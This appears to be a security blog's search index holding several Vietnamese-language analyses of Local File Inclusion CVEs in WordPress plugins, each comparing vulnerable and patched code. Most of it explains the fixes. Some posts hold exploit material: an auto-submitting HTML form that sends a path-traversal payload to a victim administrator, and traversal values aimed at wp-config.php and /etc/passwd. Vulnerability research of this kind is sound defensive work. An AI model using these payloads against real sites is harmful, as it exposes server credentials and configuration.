= $template_name; } if ( substr( $template, -4 ) !== '.php' ) { $template .= '.php'; } if ( empty( $custom_path ) ) { $located = locate_template( 'partials/vc_parts/' . $folder . '/' . $template ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/includes/shortcodes/partials/' . $folder . '/' . $template; } } else { $located = locate_template( $custom_path ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/' . $custom_path . '.php'; } } if ( file_exists( $template_name ) ) { break; } } return apply_filters( 'stm_lms_locate_vc_element', $located, $templates ); } Hàm stm_lms_locate_vc_element() có nhiệm vụ xác định và trả về đường dẫn file template (.php) Nếu có $template_name, nó sẽ ghi đè tên template mặc định và đảm bảo tên file có phần mở rộng .php. Tên file sẽ làSTM_LMS_PATH/includes/shortcodes/partia","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress WP REST Cache Plugin.","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin WP REST Cache phiên bản ≤ 2025.1.0 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-52716 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2025.1.0 Patched Versions: 2025.1.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress WP REST Cache Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP REST Cache: 2025.1.0 (vulnerable) và 2025.1.1 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Bản lỗi: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } Trong phiên bản lỗi, $sub là giá trị trả về của filter_input() lấy giá trị từ tham số GET (?sub=...) trong URL với filter FILTER_SANITIZE_FULL_SPECIAL_CHARS dùng để esacape \"\u003c\u003e\u0026 và các ký tự với ASCII value dưới 32. Tức không bao gồm .(46) và /(47) $sub được concat vào chuỗi có '.php' sau cùng trước khi được include_once mà không có cơ chế bảo vệ trước LFI. Bản vá: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } $potential_sub_file = __DIR__ . '/partials/sub-' . $sub . '.php'; if ( dirname( $potential_sub_file ) !== __DIR__ . '/partials' ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } Bản vá đã thêm cơ chế kiểm tra vị trí file trước khi include, đảm bảo file được nạp chỉ nằm trong thư mục partials. Nếu phát hiện đường dẫn ra ngoài (do chuỗi như ../), plugin tự động chuyển về file mặc định an toàn. Nhờ đó, lỗ hổng LFI bị loại bỏ. Vulnerable Code settings_page() được đăng ký làm callback của submenu add_submenu_page( 'options-general.php', 'WP REST Cache', 'WP REST Cache', $capability, 'wp-rest-cache', [ $this, 'settings_page', ] ); Tức khi truy cập endpoint GET /wp-admin/options-general.php?page=wp-rest-cache HTTP/1.1 thì settings_page() được gọi. Exploit Proof of Concept (PoC) Step 1 Tạo trang web có form, tự động gửi request với LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost:80//wp-admin/options-general.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"wp-rest-cache\"\u003e \u003cinput type=\"text\" name=\"sub\" value=\"/../../../../../../wp-cofnig\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2 Gửi link đến trang web cho admin hoặc người dùng có đặc quyền Cảnh báo Lỗ hổng này chỉ khai thác được trên Windows, vì hàm file_exists() xử lý đường dẫn khác nhau giữa hai hệ điều hành. Trên Linux, nếu đường dẫn chứa thư mục không tồn tại, hàm sẽ trả về fal","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress LatePoint Plugin.","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin LatePoint phiên bản ≤ 5.1.93 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-6715 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.1.93 Patched Versions: 5.1.94 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress LatePoint Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - LatePoint: 5.1.93 (vulnerable) và 5.1.94 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Bản lỗi: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ // rendering layout, view variable will be passed and used in layout file include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this-\u003eadd_extension($layout, '.php'); }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } Trong phiên bản lỗi, hàm render() gắn .php vào $layout và include trực tiếp mà không kiểm tra, dẫn đến Local File Inclusion (LFI) nếu $layout bị kiểm soát từ đầu vào. Bản vá: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ $layout_path = $this-\u003eget_safe_layout_path($layout); // rendering layout, view variable will be passed and used in layout file if($layout_path){ include $layout_path; }else{ __('Invalid layout', 'latepoint'); } }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } private function get_safe_layout_path($layout) { // 1. Remove any path separators and null bytes $layout = str_replace(['/', '\\\\', \"\\0\"], '', $layout); // 2. Remove any dots to prevent directory traversal $layout = str_replace('.', '', $layout); // 3. Only allow alphanumeric, underscore, and hyphen $layout = preg_replace('/[^a-zA-Z0-9_-]/', '', $layout); // 4. Construct the full path $layout_file = $this-\u003eadd_extension($layout, '.php'); $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file; // 5. Use realpath to resolve any remaining traversal attempts $real_path = realpath($full_path); $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH); // 6. Ensure the resolved path is within the layouts directory if ($real_path \u0026\u0026 $base_path \u0026\u0026 strpos($real_path, $base_path) === 0) { return $real_path; } return false; } Bản vá đã thêm get_safe_layout_path() để loại bỏ /, \\, . và null byte; chỉ cho phép [A-Za-z0-9_-]; xây dựng đường dẫn, dùng realpath() và so sánh với LATEPOINT_VIEWS_LAYOUTS_ABSPATH. Nếu hợp lệ mới include, ngăn chặn LFI. Vulnerable Code Hàm render() được gọi tại 12 vị trí khác nhau, nên việc trace thủ công sẽ rất mất thời gian. 12 vị trí gọi hàm render() Để tối ưu, ta sử dụng debugger: Đặt breakpoint trong hàm render(). Thực hiện lần lượt các thao tác trong giao diện (UI). Mỗi khi render() được gọi, chương trình sẽ tạm dừng tại breakpoint và highlight dòng code tương ứng, giúp xác định nhanh luồng gọi hàm. Video debugger nhảy đến break point 👉 Khi truy cập endpoint http://localhost/wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view với route name là các submenu của plugin thì render() được gọi với layout mặc định là admin Layout mặc định Quan sát callstack, ta thấy được luồng gọi hàm đến render() Luồng gọi hàm trong callstack function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){ $html = ''; if($this-\u003eget_return_format() == 'json'){ if(is_array($view_name)) $view_name = $view_name","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Hide My WP Ghost Plugin.","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Hide My WP Ghost phiên bản ≤ 5.4.01 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-26909 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.4.01 Patched Versions: 5.4.02 CVSS severity: High (9.6) Required Privilege: Unauthenticated Product: WordPress Hide My WP Ghost Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Hide My WP Ghost: 5.3.02 (vulnerable) và 5.4.02 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Bản lỗi: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } // Return the constructed URL return $new_url; } Hàm getOriginalUrl() dùng để phân tích và tái tạo lại URL gốc dựa trên các quy tắc rewrite trong hệ thống. Trong phiên bản lỗi, giá trị $new_url không được làm sạch trước khi trả về, cho phép kẻ tấn công chèn đường dẫn độc hại như ../../etc/passwd dẫn đến nguy cơ LFI. Bản vá: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Only if there is a path to change if( !isset( $parse_url['path'] ) ) { return $url; } // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! em","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress License For Envato Plugin.","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin License For Envato phiên bản ≤ 1.0.0 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-39399 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.0.0 Patched Versions: 1.1.0 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress License For Envato Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - License For Envato: 1.0.0 (vulnerable) và 1.1.0 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Bản lỗi: \u003cdiv class=\"wrap\"\u003e \u003c?php $action = isset( $_GET['tab'] ) ? sanitize_text_field( $_GET['tab'] ) : 'general'; ?\u003e // other logic \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { $template = \"{$licenseEnvato_nav_view}/{$action}.php\"; } if ( file_exists( $template ) ) { include $template; }else{ include \"{$licenseEnvato_nav_view}/general.php\"; } ?\u003e \u003c/div\u003e Trong phiên bản lỗi, giá trị của biến $action được lấy trực tiếp từ tham số $_GET['tab']. Mặc dù biến này được xử lý qua hàm sanitize_text_field(), hàm này chỉ loại bỏ thẻ HTML - chứ không ngăn chặn các chuỗi traversal như ../. Do đó, attacker có thể truyền vào một giá trị như ?tab=../../somefile, khiến $action chứa đường dẫn ngoài mong đợi. Khi biến này được nối vào $template và sau đó được include =\u003e Xảy ra LFI. Bản vá: \u003c?php // Exit if accessed directly defined('ABSPATH') || exit; // Define allowed tab values to prevent LFI $allowed_tabs = array('general', 'envato'); // Apply filter to allow extensions to add their own tabs $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); // Verify nonce if tab parameter is set $action = 'general'; if (isset($_GET['tab'])) { // Verify nonce for tab switching if provided if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(sanitize_text_field(wp_unslash($_GET['_wpnonce'])), 'license_envato_switch_tab')) { $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } elseif (!isset($_GET['_wpnonce'])) { // If no nonce is provided, still allow tab switching but sanitize input $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } } ?\u003e \u003cdiv class=\"wrap\"\u003e \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { // Ensure we only include files within the plugin directory structure $template = realpath(\"{$licenseEnvato_nav_view}/{$action}.php\"); $nav_view_dir = realpath($licenseEnvato_nav_view); // Verify the template is a child of the nav view directory to prevent path traversal if ($template \u0026\u0026 $nav_view_dir \u0026\u0026 strpos($template, $nav_view_dir) === 0 \u0026\u0026 file_exists($template)) { include $template; } else { // Fallback to general.php with the same security checks $general_template = realpath(\"{$licenseEnvato_nav_view}/general.php\"); if ($general_template \u0026\u0026 strpos($general_template, $nav_view_dir) === 0) { include $general_template; } } } ?\u003e \u003c/div\u003e Bản vá đã thực hiện nhiều biện pháp để ngăn chặn lỗ hổng LFI và củng cố tính bảo mật của phần xử lý tham số tab: Sử dụng whitelist $allowed_tabs $allowed_tabs = array('general', 'envato'); $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); Kiểm tra nonce chống CSRF if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(..., 'license_envato_switch_tab')) Lý do CVE được gán là Unauthenticated là vì kẻ tấn công không cần tài khoản riêng trên site ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Subscribe to Download Lite Plugin.","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Subscribe to Download Lite phiên bản ≤ 1.2.9 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-30782 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.2.9 Patched Versions: 1.3.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Subscribe to Download Lite Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Subscribe to Download Lite: 1.2.9 (vulnerable) và 1.3.0 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Bản lỗi: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); if (file_exists(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php')) { include(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php'); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e Trong phiên bản lỗi, $form_template được concat vào chuỗi và include nhưng không xác thực giá trị đầu vào =\u003e nguy cơ LFI xảy ra, ví dụ: $form_template = '../../../../../../../wp-config' Bản vá: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); $base_dir = realpath(STDL_PATH . 'inc/views/frontend/form-templates') . DIRECTORY_SEPARATOR; $sanitized_template = basename($form_template) . '.php'; $file_path = realpath($base_dir . $sanitized_template); if ($file_path \u0026\u0026 strpos($file_path, $base_dir) === 0 \u0026\u0026 file_exists($file_path)) { include($file_path); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e Bản vá sử dụng basename() để lấy phần tên file của $form_template loại bỏ các ký tự traversal sequence ../, ví dụ: ../../../../../../payload.pdf -\u003e payload.pdf Sau đó concat vào $base_dir và lấy đường dẫn tuyệt đối bằng realpath rồi include() =\u003e triệt tiêu hoàn toàn khả năng LFI. Vulnerable Code form-template.php chứa code có lỗ hổng ở trên được gọi trong stdl-shortcode.php \u003c?php $form_template = (!empty($atts['template'])) ? $atts['template'] : $form_details['layout']['template']; if (isset($_COOKIE['stdl_encryption_key']) \u0026\u0026 $this-\u003echeck_if_already_subscribed($_COOKIE['stdl_encryption_key']) \u0026\u0026 empty($form_details['general']['always_show'])) { // other logic } else { // other logic if ($display_type == 'direct') { include(STDL_PATH . 'inc/views/frontend/form-template.php'); } else { ?\u003e \u003cdiv class=\"stdl-popup-outerwrap \u003c?php echo esc_attr($popup_alias_class); ?\u003e\"\u003e \u003cinput type=\"button\" class=\"stdl-popup-trigger stdl-popup-\u003c?php echo esc_attr($form_template); ?\u003e\" value=\"\u003c?php echo esc_attr($popup_trigger_text); ?\u003e\"\u003e \u003cdiv class=\"stdl-popup-innerwrap\" style=\"display:none;\"\u003e \u003cdiv class=\"stdl-overlay stdl-popup-wrapper\"\u003e \u003cdiv class=\"stdl-popup-contetn-wrap\"\u003e \u003ca href=\"javascript:void(0)\" class=\"stdl-popup-close\"\u003e\u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c?php include(STDL_PATH . 'inc/views/frontend/form-template.php'); ?\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c?php } } $form_template là giá trị của $atts['template'] Theo kinh nghiệm phân tích CVE trên WordPress plugin của tôi, $atts thường là các attribute của shortcode, ví dụ: [pornhub id=69] Có thể thấy rằng file form-template.php luôn được include trong khối if-else nằm bên trong phần else, khi cookie stdl_encryption_key không tồn tại (tức là người dùng chưa đăng ký hoặc chưa có khóa mã hóa hợp lệ). stdl-shortcode.php được include trong callback của shortcode subscribe_to_download_form với","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Team Manager Plugin.","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Team Manager phiên bản ≤ 2.1.23 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-30868 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2.1.23 Patched Versions: 2.2.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Team Manager Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Team Manager: 2.1.23 (vulnerable) và 2.2.0 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Elementor plugin Analysis Patch diff Bản lỗi: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $styleTypeKey = \"{$layout}_style_type\"; $styleType = stripslashes($settings[$styleTypeKey]); $path = stripslashes(TM_PATH . '/public/templates/elementor/layouts/' . $layout . '/'); $templateName = sanitize_file_name( $styleType . '.php' ); //allowed file type $allowedFileTypes = [ 'php' ]; $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION); if (in_array($ext, $allowedFileTypes)) { if (file_exists($path . $templateName)) { include self::locateTemplate($templateName, '', $path); } } } private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } Trong phiên bản lỗi, hàm renderElementorLayout() không xác thực giá trị đầu vào. attacker có thể vượt qua logic trên khi kiểm soát được $layout và $settings, ví dụ: Trong hàm renderElementorLayout(): $layout = \"../../../../../../..\" $settings['../../../../../../.._style_type'] = \"wp-config\" Khi đó: $styleType = 'wp-config' $path = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $templateName=wp-config.php $path . $templateName = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php Debugger giá trị của các biến Sau khi vượt qua các mệnh đề if thì include giá trị trả về của locateTemplate(wp-config.php, '', TM_PATH . '/public/templates/elementor/layouts/../../../../../../../') : private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } Khi đó: $templatePath = public/templates $defaultPath = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $locate_template = locate_template('public/templates/wp-config.php') = \"\" - locate_template() sẽ trả về đường dẫn tuyệt đối của file nếu tìm thấy, ngược lại trả về chuỗi rỗng \"\". Khi $locate_template rỗng thì trả về TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php' để include. Bản vá: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $allowedLayouts = ['grid', 'list', 'slider', 'table', 'isotope']; // Allowed layouts if (!in_array($layout, $allowedLayouts, true)) { wp_die(__('Invalid layout.', 'wp-team-manager')); } $styleTypeKey = \"{$layout}_style_type\"; $styleType = $settings[$styleTypeKey] ?? ''; // Ensure only safe characters (alphanumeric + underscores) if (!preg_match('/^[a-zA-Z0-9_-]+$/', $styleType)) { wp_die(__('Invalid style type.', 'wp-team-manager')); } // Ensure constants exist before using them if (!defined('TM_PATH')) { w","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Motors Plugin.","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Motors phiên bản ≤ 1.4.71 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-32654 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.4.71 Patched Versions: 1.4.72 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress Motors Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Motors: 1.4.71 (vulnerable) và 1.4.72 (patched). Diff tool - 